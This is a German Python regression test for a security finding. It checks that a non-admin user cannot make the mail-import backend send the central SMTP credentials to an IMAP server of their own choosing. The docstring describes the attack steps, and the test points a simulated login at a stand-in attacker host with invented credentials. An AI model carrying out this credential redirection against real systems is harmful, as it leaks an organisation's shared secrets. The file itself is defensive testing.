"""
Regressionstest zum Sicherheitsbefund „Zentrale Mailzugangsdaten können an
einen frei wählbaren IMAP-Server gesendet werden" (Bestandsaufnahme zu Commit
1a5787e).

Ablauf des Angriffs, wie er vor der Behebung möglich war:
  1. Ein Mitarbeiter (kein Admin, nur Aufgabenrechte) legt ein persönliches
     IMAP-Konto an, setzt ``use_central_credentials`` und trägt als Server
     seinen eigenen Rechner ein.
  2. Er drückt „Verbindung testen".
  3. Das Backend meldet sich dort mit dem zentralen SMTP-Benutzer und
     -Passwort an — der Angreifer liest sie im Klartext mit.

Alle Zugangsdaten sind erfunden, die Mailverbindung ist simuliert: Es wird
weder eine Netzverbindung aufgebaut noch ein Postfach abgerufen.
"""
import imaplib
import socket

ZENTRAL_USER = "zentral-office@firma.invalid"
ZENTRAL_PASSWORT = "Erfunden-Zentral-9f3c"  # nur Testwert
ANGREIFER_HOST = "mail.angreifer.invalid"


class _ImapAufzeichnung:
    """Simuliert imaplib und merkt sich, wohin welche Anmeldung ging."""

    verbindungen: list = []
    anmeldungen: list = []

    def __init__(self, host="", port=None, *args, **kwargs):
        self.host = host
        _ImapAufzeichnung.verbindungen.append(host)

    def starttls(self, *args, **kwargs):
        return ("OK", [b""])

    def login(self, user, password):
        _ImapAufzeichnung.anmeldungen.append((self.host, user, password))
        return ("OK", [b""])

    def list(self):
        return ("OK", [b'(\\HasNoChildren) "/" "INBOX"'])

    def logout(self):
        return ("BYE", [b""])


def _imap_simulieren(monkeypatch):
    _ImapAufzeichnung.verbindungen = []
    _ImapAufzeichnung.anmeldungen = []
    monkeypatch.setattr(imaplib, "IMAP4_SSL", _ImapAufzeichnung)
    monkeypatch.setattr(imaplib, "IMAP4", _ImapAufzeichnung)
    # DNS simulieren: der Angreifer-Host ist eine gewöhnliche öffentliche Adresse
    monkeypatch.setattr(
        socket, "getaddrinfo",
        lambda host, port, *a, **k: [(2, 1, 6, "", ("81.10.20.30", port or 993))],
    )


def _zentrale_zugangsdaten(db_session):
    from app.models.settings import Setting
    db_session.add(Setting(key="smtp_user", value=ZENTRAL_USER))
    db_session.add(Setting(key="smtp_password", value=ZENTRAL_PASSWORT))
    db_session.commit()


def test_befund_mitarbeiter_kann_zentrale_zugangsdaten_nicht_umleiten(
        auth_client, db_session, monkeypatch):
    _zentrale_zugangsdaten(db_session)
    _imap_simulieren(monkeypatch)

    resp = auth_client.post("/api/mail-import/accounts", json={
        "name": "Harmlos", "protocol": "imap",
        "imap_host": ANGREIFER_HOST, "imap_port": 993, "imap_ssl": True,
        "use_central_credentials": True, "folder": "INBOX",
    })
    konto_id = resp.json().get("id") if resp.status_code == 201 else None
    if konto_id:
        auth_client.get(f"/api/mail-import/accounts/{konto_id}/folders")
        auth_client.post(f"/api/mail-import/accounts/{konto_id}/scan")

    gesendet = [a for a in _ImapAufzeichnung.anmeldungen
                if a[2] == ZENTRAL_PASSWORT]
    # Bewusst nur Host und Anzahl in der Meldung — auch ein erfundenes
    # Passwort gehört nicht in Testausgaben.
    anzahl = len(gesendet)
    ziele = sorted({h for h, _, _ in gesendet})
    assert anzahl == 0, (
        f"Zentrale Zugangsdaten wurden {anzahl}x an einen vom Mitarbeiter "
        f"gewählten Server übertragen: {ziele}")
